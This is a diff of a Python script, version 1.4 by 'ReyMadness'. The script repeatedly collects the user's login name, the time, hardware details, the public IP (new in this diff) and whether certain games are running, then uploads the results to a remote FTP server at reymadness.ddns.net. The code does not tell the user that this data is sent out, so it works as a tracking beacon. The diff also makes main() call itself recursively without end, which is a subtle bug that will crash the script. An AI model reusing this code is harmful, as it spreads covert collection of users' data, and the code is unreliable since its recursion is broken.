@@ -36,11 +36,8 @@ def get_motherboard_details():
 		motherboard_details.append(main_board)
 	return motherboard_details
 
-ver = "v1.3"
+ver = "v1.4"
 author = "ReyMadness"
-ip = "reymadness.ddns.net"
-port = 63957
-ftp = FTP()
 
 def directory_exists(name):
     filelist = []
@@ -52,16 +49,22 @@ def directory_exists(name):
 
 print("Created by", author, ver, "\n")
 
-while(True):
-    #FTP-test
+def main():
+    #FTP-check
+    ip = "reymadness.ddns.net"
+    port = 63957
+    ftp = FTP()
     try:
         ftp.connect(ip, port)
         connecton = 1
     except:
         connecton = 0
-        print('No connection')
-
-    #getting data from computer
+        print('No connection to FTP-server')
+        time.sleep(3)
+        main()
+        
+    #Getting data from computer
+    #Time
     name = os.getlogin()
     year = str(time.localtime()[0])
     month = str(time.localtime()[1])
@@ -70,6 +73,7 @@ while(True):
     minute = str(time.localtime()[4])
     second = str(time.localtime()[5])
     now = "Date: " + year + "-" + month + "-" + day + "\n" + "Time: " + hour + ":" + minute + ":" + second + "\n"
+    #Hardware
     computer = wmi.WMI()
     os_info = computer.Win32_OperatingSystem()[0]
     proc_info = computer.Win32_Processor()[0]
@@ -97,7 +101,7 @@ while(True):
         i += 1
     motherboard = b + " " + c[1:][:-3] + " " + d
     info = "Processor: {0}".format(proc_info.Name) + "\nVideo Card: {0}".format(gpu_info.Name) + "\nRAM: " + ram + "\n" + "Motherboard: " + motherboard + "\n\n"
-    
+    #Games and programs check
     if checkIfProcessRunning('discord'):
         discord = "Discord is ON\n"
     else:
@@ -113,7 +117,21 @@ while(True):
     else:
         fortnite = ""
 
-    #sending data to server
+    if checkIfProcessRunning('dota2'):
+        dota2 = "Dota 2 is ON\n"
+    else:
+        dota2 = ""
+
+    if checkIfProcessRunning('osu!'):
+        osu = "Osu! is ON\n"
+    else:
+        osu = ""
+    #IP
+    ip_check = subprocess.check_output('nslookup myip.opendns.com resolver1.opendns.com', shell=True)
+    IP = str(ip_check.split()[len(ip_check.split())-1])[2:][:-1]
+    ip = "IP: " + IP + "\n"
+
+    #Sending data to server
     if(connecton == 0):
         pass
     else:
@@ -124,10 +142,13 @@ while(True):
             pass
         ftp.cwd(name)
         f = open("data.txt", "w")
-        text = "Version: " + ver + "\n" +  name + "\n" + now + op + info + discord + csgo + fortnite
+        text = "Version: " + ver + "\n" +  name + "\n" + now + op + ip + info + discord + csgo + fortnite + dota2 + osu
         f.write(text)
         f.close()
         with open("data.txt") as fobj:
             ftp.storlines("STOR data.txt", open("data.txt", 'rb'))
+            ftp.close()
         os.remove('data.txt')
     time.sleep(1)
+    main()
+main()
